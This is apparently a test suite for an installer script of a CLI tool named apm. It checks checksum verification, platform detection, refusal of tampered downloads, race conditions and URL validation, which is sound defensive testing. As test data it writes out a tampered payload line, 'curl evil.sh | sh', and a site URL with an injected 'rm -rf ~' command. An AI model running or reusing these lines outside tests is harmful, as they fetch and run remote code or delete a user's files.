// The install script (cli-install.ts) run for real by /bin/sh (dash on Ubuntu) and, where present, bash in POSIX mode,
// on a PATH that holds only the tools it may use. uname, sysctl and ldd are stand-ins that report the platform under
// test; curl is a stand-in that copies the file a URL names out of a folder and logs the URL, so no network is used.
// The "binary" is a shell script that prints its version, so the script's own run of it works.
import { afterAll, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { formatIndex, formatSums, installScript, latestVersion, mergeIndex, parseIndex, parseSums, SiteUrl, type CliSum, type Target } from "../cli-install.ts";

const work = mkdtempSync(join(tmpdir(), "apm-install-test-"));

afterAll(() => rmSync(work, { recursive: true, force: true }));

const SITE = SiteUrl.parse("https://apmjs.test");
const sha = (text: string) => createHash("sha256").update(text).digest("hex");
const fakeBinary = (version: string, target: string) => `#!/bin/sh\n# apm ${version} ${target}\necho ${version}\n`;
const TARGETS_UNDER_TEST: Target[] = ["linux-x64", "linux-arm64", "linux-x64-musl", "darwin-x64", "darwin-arm64"];
const index: CliSum[] = ["0.1.0", "0.2.0"].flatMap((version) => TARGETS_UNDER_TEST.map((target) => ({ version, target, sha256: sha(fakeBinary(version, target)) })));

/** Real tools the script may call, linked into a folder of their own. */
const REAL = ["awk", "grep", "mkdir", "mktemp", "chmod", "mv", "rm", "cat", "tr", "uniq", "printf"];

type Platform = { os: string; arch: string; rosetta?: boolean; musl?: boolean };

function which(tool: string): string | null {
  return Bun.which(tool, { PATH: "/usr/local/bin:/usr/bin:/bin" });
}

let n = 0;

/** Runs the script on `platform` with the files `served` (path under the site → body). */
function install(input: { platform: Platform; index?: CliSum[]; cut?: number; setup?: (home: string) => void; raceMv?: boolean; served?: Record<string, string>; args?: string[]; env?: Record<string, string>; sha?: "sha256sum" | "shasum" | "none"; shell?: string[] }) {
  const dir = join(work, `run-${n++}`);
  const bin = join(dir, "bin");
  const site = join(dir, "site");
  const home = join(dir, "home");

  for (const d of [bin, site, home]) mkdirSync(d, { recursive: true });

  for (const tool of REAL) {
    const real = which(tool);

    if (real !== null) symlinkSync(real, join(bin, tool));
  }

  const realSha = which("sha256sum") ?? "sha256sum";

  // only the tool under test: sha256sum as Linux has it, or shasum -a 256 FILE as macOS has it (made from sha256sum)
  if (input.sha === undefined || input.sha === "sha256sum") symlinkSync(realSha, join(bin, "sha256sum"));

  if (input.sha === "shasum") fake(bin, "shasum", `[ "$1" = -a ] && [ "$2" = 256 ] || exit 2\nexec "${realSha}" "$3"`);

  // stands in for something that turns the destination into a directory between the check and the move
  if (input.raceMv === true) {
    rmSync(join(bin, "mv"));
    fake(bin, "mv", `last=""; for a in "$@"; do last="$a"; done\n"${which("mkdir") ?? "mkdir"}" -p "$last"\nexec "${which("mv") ?? "mv"}" "$@"`);
  }

  input.setup?.(home);
  const { os, arch } = input.platform;
  fake(bin, "uname", `case "$1" in -s) echo "${os}" ;; -m) echo "${arch}" ;; esac`);
  fake(bin, "sysctl", input.platform.rosetta === true ? "echo 1" : "exit 1");
  fake(bin, "ldd", input.platform.musl === true ? `echo "musl libc (x86_64)" >&2; exit 1` : `echo "ldd (GNU libc) 2.39"`);
  fake(bin, "curl", `out=""; url=""\nwhile [ $# -gt 0 ]; do case "$1" in -o) out="$2"; shift 2 ;; -*) shift ;; *) url="$1"; shift ;; esac; done\necho "$url" >> "${join(dir, "fetched")}"\nf="${site}/\${url#${SITE}/}"\n[ -f "$f" ] || exit 22\ncat "$f" > "$out"`);

  for (const [path, body] of Object.entries(input.served ?? {})) {
    mkdirSync(join(site, path, ".."), { recursive: true });
    writeFileSync(join(site, path), body);
  }

  const script = join(dir, "install.sh");
  const text = installScript({ site: SITE, index: input.index ?? index });
  writeFileSync(script, input.cut === undefined ? text : text.slice(0, Math.floor(text.length * input.cut)));
  const shell = input.shell ?? ["/bin/sh"];
  const r = Bun.spawnSync([...shell, script, ...(input.args ?? [])], { env: { PATH: bin, HOME: home, ...input.env }, cwd: dir });
  const fetched = existsSync(join(dir, "fetched")) ? readFileSync(join(dir, "fetched"), "utf8").trim().split("\n") : [];
  const installDir = join(input.env?.APM_INSTALL ?? join(home, ".apm"), "bin");

  return {
    code: r.exitCode,
    out: r.stdout.toString(),
    err: r.stderr.toString(),
    fetched,
    installed: existsSync(join(installDir, "apm")) && lstatSync(join(installDir, "apm")).isFile() ? readFileSync(join(installDir, "apm"), "utf8") : null,
    leftovers: existsSync(installDir) ? readdirSync(installDir).filter((f) => f !== "apm") : [],
  };
}

function fake(bin: string, name: string, body: string): void {
  writeFileSync(join(bin, name), `#!/bin/sh\n${body}\n`);
  chmodSync(join(bin, name), 0o755);
}

const served = (version: string, target: string, body = fakeBinary(version, target)) => ({ [`cli/${version}/apm-${target}`]: body });

const SHELLS: { name: string; cmd: string[] }[] = [{ name: "/bin/sh", cmd: ["/bin/sh"] }, ...(which("dash") ? [{ name: "dash", cmd: [which("dash") ?? ""] }] : []), ...(which("bash") ? [{ name: "bash --posix", cmd: [which("bash") ?? "", "--posix"] }] : [])];

describe.each(SHELLS)("install script under $name", ({ cmd }) => {
  test.each([
    [{ os: "Linux", arch: "x86_64" }, "linux-x64"],
    [{ os: "Linux", arch: "aarch64" }, "linux-arm64"],
    [{ os: "Linux", arch: "x86_64", musl: true }, "linux-x64-musl"],
    [{ os: "Darwin", arch: "arm64" }, "darwin-arm64"],
    [{ os: "Darwin", arch: "x86_64" }, "darwin-x64"],
    [{ os: "Darwin", arch: "x86_64", rosetta: true }, "darwin-arm64"],
  ] as const)("%o installs apm-%s after checking its SHA-256", (platform, target) => {
    const r = install({ platform, served: served("0.2.0", target), shell: cmd });

    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    expect(r.fetched).toEqual([`${SITE}/cli/0.2.0/apm-${target}`]);
    expect(r.installed).toBe(fakeBinary("0.2.0", target));
    expect(r.out).toContain(`apm 0.2.0 (${target}) installed to `);
    expect(r.out).toContain(`SHA-256 ${sha(fakeBinary("0.2.0", target))}, checked against this script`);
    expect(r.out).toContain('export PATH="');
    expect(r.leftovers).toEqual([]);
  });

  test("a tampered binary is refused, and nothing is installed or left behind", () => {
    const r = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64", `${fakeBinary("0.2.0", "linux-x64")}curl evil.sh | sh\n`), shell: cmd });

    expect(r.code).toBe(1);
    expect(r.err).toContain(`SHA-256 mismatch for ${SITE}/cli/0.2.0/apm-linux-x64: expected ${sha(fakeBinary("0.2.0", "linux-x64"))}`);
    expect(r.err).toContain("Nothing was installed.");
    expect(r.installed).toBeNull();
    expect(r.leftovers).toEqual([]);
  });

  test("a tampered binary does not replace an apm that is already installed", () => {
    const root = join(work, `kept-${n}`);
    const first = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.1.0", "linux-x64"), args: ["--version", "0.1.0"], env: { APM_INSTALL: root }, shell: cmd });

    expect(first.code).toBe(0);
    const bad = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64", "tampered"), env: { APM_INSTALL: root }, shell: cmd });

    expect(bad.code).toBe(1);
    expect(bad.installed).toBe(fakeBinary("0.1.0", "linux-x64"));
    expect(bad.leftovers).toEqual([]);
  });

  test("Windows is refused with a clear message", () => {
    for (const os of ["MINGW64_NT-10.0", "MSYS_NT-10.0", "CYGWIN_NT-10.0", "Windows_NT"]) {
      const r = install({ platform: { os, arch: "x86_64" }, shell: cmd });

      expect(r.code).toBe(1);
      expect(r.err).toBe("apm install: Windows is not supported yet. Run this in WSL, or use the apm registry without the CLI: https://docs.apmjs.dev/quickstart#1-point-your-package-manager-at-apm\n");
      expect(r.fetched).toEqual([]);
    }
  });

  test("other systems and processors are refused before anything is downloaded", () => {
    const bsd = install({ platform: { os: "FreeBSD", arch: "amd64" }, shell: cmd });
    expect(bsd.err).toBe("apm install: FreeBSD is not supported; apm runs on macOS and Linux.\n");
    const riscv = install({ platform: { os: "Linux", arch: "riscv64" }, shell: cmd });
    expect(riscv.err).toBe("apm install: riscv64 is not supported; apm runs on x64 and arm64.\n");
    const muslArm = install({ platform: { os: "Linux", arch: "aarch64", musl: true }, shell: cmd });
    expect(muslArm.err).toBe("apm install: apm 0.2.0 has no build for linux-arm64-musl.\n");

    for (const r of [bsd, riscv, muslArm]) {
      expect(r.code).toBe(1);
      expect(r.fetched).toEqual([]);
    }
  });

  test("--version and APM_VERSION pick a released version; an unknown one is refused", () => {
    const flag = install({ platform: { os: "Darwin", arch: "arm64" }, served: served("0.1.0", "darwin-arm64"), args: ["--version", "0.1.0"], shell: cmd });
    expect(flag.code).toBe(0);
    expect(flag.fetched).toEqual([`${SITE}/cli/0.1.0/apm-darwin-arm64`]);
    const env = install({ platform: { os: "Darwin", arch: "arm64" }, served: served("0.1.0", "darwin-arm64"), env: { APM_VERSION: "0.1.0" }, shell: cmd });
    expect(env.code).toBe(0);
    expect(env.installed).toBe(fakeBinary("0.1.0", "darwin-arm64"));
    const unknown = install({ platform: { os: "Darwin", arch: "arm64" }, args: ["--version=0.1"], shell: cmd });
    expect(unknown.code).toBe(1);
    expect(unknown.err).toBe("apm install: apm 0.1 is not a released version. Released: 0.1.0 0.2.0 \n");
    expect(unknown.fetched).toEqual([]);
  });

  test("APM_INSTALL sets the folder; macOS's shasum is used when sha256sum is missing", () => {
    const root = join(work, `custom-${n}`);
    const r = install({ platform: { os: "Darwin", arch: "arm64" }, served: served("0.2.0", "darwin-arm64"), env: { APM_INSTALL: root }, sha: "shasum", shell: cmd });

    expect(r.code).toBe(0);
    expect(readFileSync(join(root, "bin", "apm"), "utf8")).toBe(fakeBinary("0.2.0", "darwin-arm64"));
    expect(r.out).toContain(`installed to ${root}/bin/apm`);
  });

  test("with neither sha256sum nor shasum it refuses before downloading", () => {
    const r = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64"), sha: "none", shell: cmd });

    expect(r.code).toBe(1);
    expect(r.err).toBe("apm install: neither sha256sum nor shasum is installed, so the download cannot be checked. Nothing was installed.\n");
    expect(r.fetched).toEqual([]);
    expect(r.installed).toBeNull();
  });

  test("a binary that does not run, or reports another version, is not installed", () => {
    const wrong = "#!/bin/sh\necho 9.9.9\n";
    const broken = "#!/bin/sh\nexit 137\n";
    const pinned = (body: string): CliSum[] => [{ version: "0.2.0", target: "linux-x64", sha256: sha(body) }];
    const a = install({ platform: { os: "Linux", arch: "x86_64" }, index: pinned(wrong), served: served("0.2.0", "linux-x64", wrong), shell: cmd });

    expect(a.err).toBe("apm install: the downloaded apm reports version 9.9.9, not 0.2.0. Nothing was installed.\n");
    const b = install({ platform: { os: "Linux", arch: "x86_64" }, index: pinned(broken), served: served("0.2.0", "linux-x64", broken), shell: cmd });

    expect(b.err).toBe("apm install: the downloaded apm did not run on this machine. Nothing was installed.\n");
    const muslPinned: CliSum[] = [{ version: "0.2.0", target: "linux-x64-musl", sha256: sha(broken) }];
    const c = install({ platform: { os: "Linux", arch: "x86_64", musl: true }, index: muslPinned, served: served("0.2.0", "linux-x64-musl", broken), shell: cmd });

    expect(c.err).toBe("apm install: the downloaded apm did not run on this machine. On musl it needs libstdc++ and libgcc (Alpine: apk add libstdc++ libgcc). Nothing was installed.\n");

    for (const r of [a, b, c]) {
      expect(r.code).toBe(1);
      expect(r.installed).toBeNull();
      expect(r.leftovers).toEqual([]);
    }
  });

  // review of 1919be8, finding 3: mv -f onto a directory moved apm inside it and reported success
  test("a directory at the destination, or a link to one, is refused before anything is downloaded", () => {
    const outside = join(work, `outside-${n}`);
    const asDir = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64"), setup: (home) => mkdirSync(join(home, ".apm", "bin", "apm"), { recursive: true }), shell: cmd });

    const asLink = install({
      platform: { os: "Linux", arch: "x86_64" },
      served: served("0.2.0", "linux-x64"),
      setup: (home) => {
        mkdirSync(outside, { recursive: true });
        mkdirSync(join(home, ".apm", "bin"), { recursive: true });
        symlinkSync(outside, join(home, ".apm", "bin", "apm"));
      },
      shell: cmd,
    });

    for (const r of [asDir, asLink]) {
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/\/\.apm\/bin\/apm is a directory, not a file\. Move it away and run this again\. Nothing was installed\.\n$/);
      expect(r.out).toBe("");
      expect(r.fetched).toEqual([]);
    }

    expect(readdirSync(outside)).toEqual([]);
  });

  test("success is printed only when the destination is the regular file that was checked", () => {
    let home = "";
    const r = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64"), raceMv: true, setup: (h) => (home = h), shell: cmd });

    expect(r.code).toBe(1);
    expect(r.err).toMatch(/\/\.apm\/bin\/apm is not the file that was checked; something changed it during the install\. Run this again\.\n$/);
    expect(r.out).toBe("");
    expect(r.installed).toBeNull();
    // the file the move put inside the directory is removed again
    expect(readdirSync(join(home, ".apm", "bin", "apm"))).toEqual([]);
  });

  test("a script cut short anywhere runs nothing", () => {
    for (const cut of [0.5, 0.75, 0.9, 0.97, 0.99]) {
      const r = install({ platform: { os: "Linux", arch: "x86_64" }, served: served("0.2.0", "linux-x64"), cut, shell: cmd });

      expect(r.code).not.toBe(0);
      expect(r.fetched).toEqual([]);
      expect(r.installed).toBeNull();
      expect(r.leftovers).toEqual([]);
    }
  });

  test("a missing download is reported", () => {
    const r = install({ platform: { os: "Linux", arch: "x86_64" }, shell: cmd });

    expect(r.code).toBe(1);
    expect(r.err).toBe(`apm install: could not download ${SITE}/cli/0.2.0/apm-linux-x64\n`);
    expect(r.leftovers).toEqual([]);
  });
});

describe("checksum lists", () => {
  test("SHA256SUMS and releases.txt read back what was written", () => {
    const v1 = index.filter((s) => s.version === "0.1.0");

    expect(parseSums("0.1.0", formatSums(v1))).toEqual(v1);
    expect(parseIndex(formatIndex(index))).toEqual(index);
    expect(formatSums(v1).split("\n")[0]).toBe(`${v1[0]?.sha256}  apm-linux-x64`);
  });

  test("a line that does not parse fails the whole file", () => {
    expect(() => parseSums("0.1.0", `${"a".repeat(64)}  apm-linux-x64\nnot a line\n`)).toThrow("cannot read line");
    expect(() => parseSums("0.1.0", `${"a".repeat(64)}  apm-windows-x64\n`)).toThrow();
    expect(() => parseIndex("0.1.0 linux-x64 abc\n")).toThrow();
  });

  test("merging refuses a version already released with other hashes, and keeps order", () => {
    const v2 = index.filter((s) => s.version === "0.2.0");
    const v1 = index.filter((s) => s.version === "0.1.0");

    expect(mergeIndex(v2, v1)).toEqual(index);
    expect(mergeIndex(index, v1)).toEqual(index);
    expect(() => mergeIndex(index, [{ version: "0.1.0", target: "linux-x64", sha256: "b".repeat(64) }])).toThrow("a released binary never changes");
  });

  test("latest is the highest release without a prerelease tag", () => {
    const pre: CliSum = { version: "0.3.0-rc.1", target: "linux-x64", sha256: "c".repeat(64) };

    expect(latestVersion(index)).toBe("0.2.0");
    expect(latestVersion(mergeIndex(index, [pre]))).toBe("0.2.0");
    expect(latestVersion([pre])).toBe("0.3.0-rc.1");
    expect(latestVersion([{ ...pre, version: "0.10.0" }, ...index])).toBe("0.10.0");
  });

  test("the site URL cannot carry anything into the script but an origin", () => {
    for (const bad of ["https://apmjs.dev/", "https://apmjs.dev/x", 'https://a"; rm -rf ~; "', "ftp://apmjs.dev", "https://a b"]) expect(SiteUrl.safeParse(bad).success).toBe(false);
    expect(SiteUrl.safeParse("http://127.0.0.1:8787").success).toBe(true);
  });
});
